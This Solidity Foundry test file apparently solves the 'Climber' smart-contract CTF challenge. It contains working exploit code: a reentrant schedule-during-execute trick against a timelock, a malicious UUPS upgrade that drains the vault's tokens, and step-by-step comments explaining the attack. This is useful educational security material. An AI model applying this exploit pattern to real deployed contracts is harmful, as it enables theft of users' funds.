// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import "forge-std/Test.sol";
import {Utilities} from "./Utilities.sol";

import {MockERC20} from "../mocks/MockERC20.sol";
import {ClimberVault} from "../../src/Week17-18/Climber/ClimberVault.sol";
import {ClimberTimelock} from "../../src/Week17-18/Climber/ClimberTimelock.sol";

import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ERC1967Utils} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

//forge test --mc ClimberTest -vvvv
contract ClimberTest is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    MockERC20 internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature("initialize(address,address,address)", deployer, proposer, sweeper);
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(ClimberVault(address(climberVaultProxy)).getSweeper(), sweeper);

        assertGt(ClimberVault(address(climberVaultProxy)).getLastWithdrawalTimestamp(), 0);

        climberTimelock = ClimberTimelock(payable(ClimberVault(address(climberVaultProxy)).owner()));

        assertTrue(climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer));

        assertTrue(climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer));

        // Deploy token and transfer initial token balance to the vault
        dvt = new MockERC20();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
        * EXPLOIT START *
        */
        bytes32 salt = keccak256("bad");
        address[] memory _targets = new address[](3);
        uint256[] memory _values = new uint256[](3);
        bytes[] memory _dataElements = new bytes[](3);

        MaliciousContract maliciousContract = new MaliciousContract();

        // 1. Call to transfer ownership of ClimberVault to attacker
        _targets[0] = address(climberVaultProxy);
        _values[0] = 0;
        _dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);

        // 2. Call to grant PROPOSER_ROLE to MaliciousContract
        _targets[1] = address(climberTimelock);
        _values[1] = 0;
        _dataElements[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)", 
            climberTimelock.PROPOSER_ROLE(), 
            address(maliciousContract) 
        );

        // 3. Call to MaliciousContract to schedule the operation
        _targets[2] = address(maliciousContract);
        _values[2] = 0;
        _dataElements[2] = abi.encodeWithSignature(
            "scheduleOp(address,address,address,bytes32)",
            attacker,
            address(climberVaultProxy),
            address(climberTimelock),
            salt
        );

        // Now execute the operation
        vm.startPrank(attacker);
        climberTimelock.execute(_targets, _values, _dataElements, salt);

        // Upgrade the vault to a malicious version.
        // The `upgradeToAndCall` function to call to upgrade the implementation is found in the 
        // implementation contract (ClimberVault), not the proxy contract (ERC1967). 
        // ERC1967 is just for us to interact with the implementation contract through the proxy address.
        // However, the `upgradeToAndCall` function needs to be called through the proxy address.
        MaliciousVault maliciousVault = new MaliciousVault();
        ClimberVault(address(climberVaultProxy)).upgradeToAndCall(address(maliciousVault), "");

        // Withdraw all the funds
        MaliciousVault(address(climberVaultProxy)).withdraw(address(dvt), attacker);

        /**
        * EXPLOIT END *
        */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }

}

contract MaliciousContract {
    function scheduleOp(
        address attacker, 
        address vaultAddr, 
        address vaultTimelockAddr,
        bytes32 salt
    ) external {
        ClimberTimelock climberTimelock = ClimberTimelock(payable(vaultTimelockAddr));

        //Replicate
        address[] memory _targets = new address[](3);
        uint256[] memory _values = new uint256[](3);
        bytes[] memory _dataElements = new bytes[](3);

        // 1. Call to transfer ownership of ClimberVault to attacker
        _targets[0] = vaultAddr;
        _values[0] = 0;
        _dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);

        // 2. Call to grant PROPOSER_ROLE to this contract since it will create the schedule
        _targets[1] = vaultTimelockAddr;
        _values[1] = 0;
        _dataElements[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)", 
            climberTimelock.PROPOSER_ROLE(), 
            address(this)
        );
    
        // 3. Call to schedule the operation
        _targets[2] = address(this);
        _values[2] = 0;
        _dataElements[2] = abi.encodeWithSignature(
            "scheduleOp(address,address,address,bytes32)",
            attacker,
            vaultAddr,
            vaultTimelockAddr,
            salt
        );

        //Contructed operation matches the original execute operation so ids will be the same.
        //Now schedule the operation in the middle of the original `execute` call.
        climberTimelock.schedule(_targets, _values, _dataElements, salt);
    }
}

contract MaliciousVault is ClimberVault {
    function withdraw(address tokenAddress, address recipient) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        token.transfer(recipient, token.balanceOf(address(this)));
    }
}

// Exploit:
// 1. The ownership of ClimberVault is transferred to ClimberTimelock on deployment.
// 2. Attacking the contract via the sweeper role not possible because we cant change the sweeper address.
// 3. Vault contract only allows withdrawal of 1 ether every `WAITING_PERIOD` (15 days). So even if we
//    became the owner, we can't withdraw all the funds at once. Since we're dealing with a proxy, we can
//    try to become the owner of the contract so we can upgrade it to a malicious `withdraw` function.
// 4. In the `execute` function of ClimberTimelock, function can be called by an arbitrary address.
// 5. The `execute` function first calculates the ID of the operation, meaning it must be scheduled prior.
// 6. The `execute` function then executes all the operations (array of targets, values, dataElements).
//    This is achieved with a low-level call to the target address.
// 7. The `execute` function then check if the operation's id is scheduled, and has the `ReadyForExecution` state.
// 8. The `execute` function sets the operation id as executed (as true).
// 9. If you look closely, theres a reentrancy vulnerability in the `execute` function, since we are making the
//    low-level calls prior to checking the state of the operation.
//
// Attack:
// 1. When `execute` is called and the target is `ClimberVault`, the `msg.sender` in the execution context will
//    be the `ClimberTimelock` contract. So we can encode a `transferOwnership` call to the `ClimberVault` contract
//    to set our attacking address as the owner.
// 2. Now that we have ownership, we can create a malicious contract that will schedule the operation.
// 3. Encode a call to ClimberTimelock to call `grantRole` to give the malicious contract the `PROPOSER_ROLE`.
// 4. Encode a call to ClimberTimelock call the attacking function: `scheduleOp`,  in the malicious contract.
// 5. Inside the `scheduleOp` function in the malicious contract, we need to replicate the same set of encoded
//    function calls: ClimberVault.transferOwnership -> ClimberTimelock.grantRole -> MaliciousContract.schedule.
// 6. Why do we need to repeat the calls?
//    - Firstly, this is because of the id calculated by `getOperationId`, the scheduled operation's id must match
//      the id of the operation that is being executed.
//
//    - Secondly, `getOperationSstate` is designed to enforce a delay between a scheduled operation and its execution.
//      If you schedule an operation, then it can only be executed after the delay has passed. But we want to bypass
//      this delay, so we need to schedule the operation in the same transaction as the execution.
//
//    - Thirdly, because the `execute` function is reentrant, when both the `schedule` and `execute` functions are
//      called in the same transaction (while having the same id), we can bypass the delay and execute the operation
//      that should have been delayed.
//
// 7. To elaborate on the last point:
//    - In the original `execute` call:
//      "ClimberVault.transferOwnership -> ClimberTimelock.grantRole -> MaliciousContract.scheduleOp".
//      The `MaliciousContract.scheduleOp` function is basically a call to the PROPOSER to execute some arbitrary
//      function. Assume that this creates the id: 0xbad.
//      Keep in mind that when `MaliciousContract.scheduleOp` is called in `execute`, the control is handed to 
//      the `MaliciousContract`. The execution context of the `execute` call is now the `MaliciousContract`, and
//      it is not completed yet.
//
//    - In the `MaliciousContract.scheduleOp` function, we replicate the same set of calls:
//      "ClimberVault.transferOwnership -> ClimberTimelock.grantRole -> MaliciousContract.scheduleOp".
//      This will create the same id: 0xbad.
//      However, instead of calling `execute` after contructing the calls in the operation, we call
//      'ClimberVault.schedule` to schedule the operation instead of executing it.
//      Now, this will actually create the schedule for the operation with id: 0xbad, in `ClimberTimelock`.
//      The execution will now return to the original `execute` call, and the `execute` function will complete.
//      From the `ClimberTimeLock`'s perspective, the original `execute` call was intended to call `schedule`, to
//      create a schedule (which it does) but it also successfully called: 
//      "ClimberVault.transferOwnership -> ClimberTimelock.grantRole" before creating the schedule, which will now
//      actually transfer the ownership to the attacker.
//
//    - The trick here was that the `execute` function was reentrant, and the `schedule` function was called in the
//      same transaction as the `execute` function. By calling `execute` first, and then `schedule` in the same
//      transaction, we tricked `ClimberTimelock` into executing the operation that should have been delayed.
//
//  8. Now that we have ownership of the `ClimberVault`, we can upgrade the contract to a malicious version that
//     allows us to withdraw all the funds.
